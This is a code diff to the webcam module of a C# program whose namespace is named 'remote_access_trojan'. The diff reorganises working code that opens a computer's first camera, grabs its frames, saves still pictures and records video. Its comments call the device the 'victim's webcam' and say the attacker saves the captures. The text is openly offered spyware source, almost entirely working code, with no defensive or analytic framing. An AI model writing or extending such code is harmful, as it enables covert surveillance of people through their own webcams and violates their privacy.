@@ -9,20 +9,35 @@ namespace remote_access_trojan
 {
     class Webcam
     {
-        //variables for accessing wecam and using it
-        private FilterInfoCollection webcam = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-        private VideoCaptureDevice capture = null;
-        private Bitmap bit = null;
-        private VideoFileWriter writer;
+        //variables
+        private FilterInfoCollection webcam;                //input devices
+        private VideoCaptureDevice camera;                  //what will be used to see
+        private Bitmap bit;                                 //used for pictures
+        private VideoFileWriter writer;                     //used for recording
 
         public Webcam()
         {
-            capture = new VideoCaptureDevice(webcam[0].MonikerString);
-            capture.NewFrame += new NewFrameEventHandler(capture_NewFrame);
-            capture.Start();
+            webcam = new FilterInfoCollection(FilterCategory.VideoInputDevice);     //gets all video input devices
+            camera = new VideoCaptureDevice(webcam[0].MonikerString);               //gets single camer (victim's webcam)
+            camera.NewFrame += new NewFrameEventHandler(capture_NewFrame);          //adds frame-by-frame to camera
+            camera.Start();                                                         //starts camera
         }
 
-        //Turns on the camera
+        //cam_NewFram handler
+        //clones frame-by-frame from camera
+        private void capture_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            bit = (Bitmap)eventArgs.Frame.Clone();
+        }
+
+        //Takes a screenshot and saves to current directory
+        public void TakePicture(int index)
+        {
+            if (bit != null)
+                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + index + ".png"));
+        }
+
+        //Starts recording
         public void StartVideo(int index)
         {
             writer = new VideoFileWriter();
@@ -36,24 +51,11 @@ namespace remote_access_trojan
             StopWebcam();
         }
 
-        //cam_NewFram handler
-        private void capture_NewFrame(object sender, NewFrameEventArgs eventArgs)
-        {
-            bit = (Bitmap)eventArgs.Frame.Clone();
-        }
-
-        //Takes a screenshot and allows attacker to save where they want
-        public void TakePicture(int index)
-        {
-            if (bit != null)
-                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + index + ".png"));
-        }
-
         //Stops camera
         private void StopWebcam()
         {
-            if (capture != null && capture.IsRunning)
-                capture.Stop();
+            if (camera != null && camera.IsRunning)
+                camera.Stop();
         }
     }
 }
